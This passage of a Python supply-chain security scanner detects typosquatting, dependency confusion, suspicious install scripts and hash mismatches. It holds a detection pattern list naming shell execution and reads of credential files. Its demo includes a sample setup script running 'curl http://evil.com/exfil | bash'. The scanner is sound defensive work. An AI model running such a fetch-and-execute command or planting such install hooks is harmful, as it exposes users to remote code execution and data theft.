    """

    def similarity(self, a: str, b: str) -> float:
        return SequenceMatcher(None, a.lower(), b.lower()).ratio()

    def detect(self, pkg: Package, known_packages: Set[str],
                threshold: float = 0.85) -> Optional[SupplyChainFinding]:
        pkg_name = pkg.name.lower()
        for known in known_packages:
            if pkg_name == known:
                continue
            sim = self.similarity(pkg_name, known)
            if sim >= threshold:
                # Check for common typosquatting patterns
                patterns = [
                    self._is_hyphen_underscore_swap(pkg_name, known),
                    self._is_char_insertion(pkg_name, known),
                    self._is_char_swap(pkg_name, known),
                ]
                if any(patterns) or sim >= 0.9:
                    return SupplyChainFinding(
                        severity="CRITICAL",
                        attack_type="TYPOSQUATTING",
                        package=pkg.name,
                        version=pkg.version,
                        description=f"'{pkg.name}' is suspiciously similar to '{known}' (similarity: {sim:.0%})",
                        evidence=[
                            f"Known package: {known}",
                            f"Similarity score: {sim:.2f}",
                            f"Author: {pkg.author}",
                            f"Downloads: {pkg.download_count:,}",
                        ],
                        remediation=f"Do not install. Use verified package '{known}' from official registry.",
                        cvss_score=9.8,
                    )
        return None

    def _is_hyphen_underscore_swap(self, a: str, b: str) -> bool:
        return a.replace('-', '_') == b or a.replace('_', '-') == b

    def _is_char_insertion(self, typo: str, correct: str) -> bool:
        if abs(len(typo) - len(correct)) != 1:
            return False
        longer, shorter = (typo, correct) if len(typo) > len(correct) else (correct, typo)
        for i in range(len(longer)):
            if longer[:i] + longer[i+1:] == shorter:
                return True
        return False

    def _is_char_swap(self, a: str, b: str) -> bool:
        if len(a) != len(b):
            return False
        diffs = [(ca, cb) for ca, cb in zip(a, b) if ca != cb]
        return len(diffs) == 2 and diffs[0] == diffs[1][::-1]


class DependencyConfusionDetector:
    """
    Detects dependency confusion attacks:
    Internal package names published to public registries.
    """

    def detect(self, pkg: Package, internal_namespaces: Set[str]) -> Optional[SupplyChainFinding]:
        for ns in internal_namespaces:
            if pkg.name.lower().startswith(ns.lower()) and not pkg.is_internal:
                if pkg.download_count < 100 and pkg.published_date > datetime.now() - timedelta(days=90):
                    return SupplyChainFinding(
                        severity="CRITICAL",
                        attack_type="DEPENDENCY_CONFUSION",
                        package=pkg.name,
                        version=pkg.version,
                        description=f"Internal namespace '{ns}' found on PUBLIC registry '{pkg.registry}'",
                        evidence=[
                            f"Registry: {pkg.registry}",
                            f"Published: {pkg.published_date.date()}",
                            f"Downloads: {pkg.download_count}",
                            f"Author: {pkg.author}",
                        ],
                        remediation=(
                            "Block public package. Configure package manager to use internal registry only. "
                            "Add 'private': true to package.json or use --index-url for pip."
                        ),
                        cvss_score=9.0,
                    )
        return None


class MaliciousPackageDetector:
    """
    Detects indicators of compromised or malicious packages:
    - Unexpected maintainer changes
    - Post-install scripts
    - Network access in setup code
    - Obfuscated code patterns
    """

    SUSPICIOUS_SETUP_PATTERNS = [
        (r'os\.system|subprocess', "Shell command execution in setup"),
        (r'socket\.|urllib|requests\.|http', "Network access in setup/install"),
        (r'base64\.b64decode|eval\(', "Obfuscated code execution"),
        (r'/etc/passwd|/etc/shadow|id_rsa', "Sensitive file access"),
        (r'CRYPTO|wallet|bitcoin|ethereum', "Cryptocurrency-related code"),
    ]

    def analyze_package_metadata(self, pkg: Package,
                                   maintainer_history: List[str]) -> List[SupplyChainFinding]:
        findings = []
        # Check for maintainer change
        if len(maintainer_history) >= 2 and maintainer_history[-1] != maintainer_history[-2]:
            new_owner = maintainer_history[-1]
            old_owner = maintainer_history[-2]
            if pkg.download_count > 10000:
                findings.append(SupplyChainFinding(
                    severity="HIGH",
                    attack_type="MAINTAINER_CHANGE",
                    package=pkg.name, version=pkg.version,
                    description=f"Popular package changed maintainer: {old_owner} -> {new_owner}",
                    evidence=[f"Old: {old_owner}", f"New: {new_owner}",
                               f"Downloads: {pkg.download_count:,}"],
                    remediation="Pin to last known-good version; audit new maintainer's changes",
                    cvss_score=7.5,
                ))
        # Check for extremely recent publish of very popular package name
        age_days = (datetime.now() - pkg.published_date).days
        if age_days < 7 and pkg.download_count > 1000:
            findings.append(SupplyChainFinding(
                severity="HIGH",
                attack_type="SUSPICIOUS_POPULARITY_SPIKE",
                package=pkg.name, version=pkg.version,
                description=f"Package published {age_days}d ago but has {pkg.download_count:,} downloads",
                evidence=[f"Age: {age_days} days", f"Downloads: {pkg.download_count:,}"],
                remediation="Investigate download spike; may indicate bot-driven installs",
                cvss_score=6.5,
            ))
        return findings

    def scan_setup_script(self, pkg_name: str, setup_code: str) -> List[SupplyChainFinding]:
        findings = []
        for pattern, description in self.SUSPICIOUS_SETUP_PATTERNS:
            if re.search(pattern, setup_code):
                findings.append(SupplyChainFinding(
                    severity="CRITICAL",
                    attack_type="MALICIOUS_INSTALL_SCRIPT",
                    package=pkg_name, version="?",
                    description=f"Suspicious code in install script: {description}",
                    evidence=[re.findall(pattern, setup_code)[:2]],
                    remediation="Do not install. Report to registry security team.",
                    cvss_score=9.5,
                ))
        return findings


class IntegrityVerifier:
    """Verifies package checksums against known-good hashes."""

    def __init__(self):
        self._known_hashes: Dict[str, str] = {}  # pkg@ver -> sha256

    def register(self, package: str, version: str, sha256: str):
        self._known_hashes[f"{package}@{version}"] = sha256

    def verify(self, pkg: Package) -> Optional[SupplyChainFinding]:
        key = f"{pkg.name}@{pkg.version}"
        known = self._known_hashes.get(key)
        if known and pkg.sha256 and known != pkg.sha256:
            return SupplyChainFinding(
                severity="CRITICAL",
                attack_type="INTEGRITY_VIOLATION",
                package=pkg.name, version=pkg.version,
                description=f"Package hash mismatch for {pkg.name}@{pkg.version}",
                evidence=[f"Expected: {known[:16]}...", f"Got: {pkg.sha256[:16]}..."],
                remediation="Do not use. Package may be tampered. Report to registry immediately.",
                cvss_score=10.0,
            )
        return None


class SupplyChainAnalyzer:
    """Complete supply chain security analysis orchestrator."""

    def __init__(self):
        self.typosquat = TyposquattingDetector()
        self.dep_confusion = DependencyConfusionDetector()
        self.malicious = MaliciousPackageDetector()
        self.integrity = IntegrityVerifier()
        self.findings: List[SupplyChainFinding] = []

    def analyze_package(self, pkg: Package,
                         maintainer_history: List[str] = None,
                         setup_code: str = "",
                         registry: str = "pypi") -> List[SupplyChainFinding]:
        local_findings = []
        known = KNOWN_LEGITIMATE.get(registry, set())
        f1 = self.typosquat.detect(pkg, known)
        if f1: local_findings.append(f1)
        f2 = self.dep_confusion.detect(pkg, INTERNAL_NAMESPACES)
        if f2: local_findings.append(f2)
        if maintainer_history:
            local_findings.extend(
                self.malicious.analyze_package_metadata(pkg, maintainer_history)
            )
        if setup_code:
            local_findings.extend(self.malicious.scan_setup_script(pkg.name, setup_code))
        f3 = self.integrity.verify(pkg)
        if f3: local_findings.append(f3)
        self.findings.extend(local_findings)
        return local_findings

    def sbom_scan(self, packages: List[Package]) -> Dict:
        """Scan a Software Bill of Materials (SBOM)."""
        for pkg in packages:
            self.analyze_package(pkg, registry=pkg.registry)
        critical = sum(1 for f in self.findings if f.severity == "CRITICAL")
        return {
            "packages_scanned": len(packages),
            "total_findings": len(self.findings),
            "critical": critical,
            "by_type": {t: sum(1 for f in self.findings if f.attack_type == t)
                         for t in set(f.attack_type for f in self.findings)},
            "risk_level": "CRITICAL" if critical > 0 else "HIGH" if self.findings else "LOW",
        }


if __name__ == "__main__":
    analyzer = SupplyChainAnalyzer()
    analyzer.integrity.register("requests", "2.31.0", "abc123legitimate")
    packages = [
        Package("reqeusts", "2.31.0", "pypi", "unknown",
                datetime(2024, 1, 10), 150, description="HTTP library"),
        Package("@myorg/auth-utils", "1.0.0", "npm", "attacker123",
                datetime(2024, 1, 14), 50),
        Package("requests", "2.31.0", "pypi", "psf",
                datetime(2023, 5, 22), 500000000,
                sha256="tampered_hash_xyz789"),  # Hash mismatch!
        Package("flask", "3.0.0", "pypi", "new_maintainer",
                datetime(2024, 1, 13), 200000),
    ]
    setup_scripts = {
        "@myorg/auth-utils": "import subprocess\nsubprocess.call('curl http://evil.com/exfil | bash', shell=True)"
    }
    histories = {
        "flask": ["pallets", "pallets", "new_maintainer"],
    }
    for pkg in packages:
        findings = analyzer.analyze_package(
            pkg,
            maintainer_history=histories.get(pkg.name),
            setup_code=setup_scripts.get(pkg.name, ""),
            registry=pkg.registry,
        )
        if findings:
            print(f"Package: {pkg.name}@{pkg.version}")
            for f in findings:
                print(f"  [{f.severity}] {f.attack_type}: {f.description}")
                print(f"    Fix: {f.remediation}")
    sbom = analyzer.sbom_scan(packages)
    print(f"\nSBOM Scan: {json.dumps(sbom, indent=2)}")
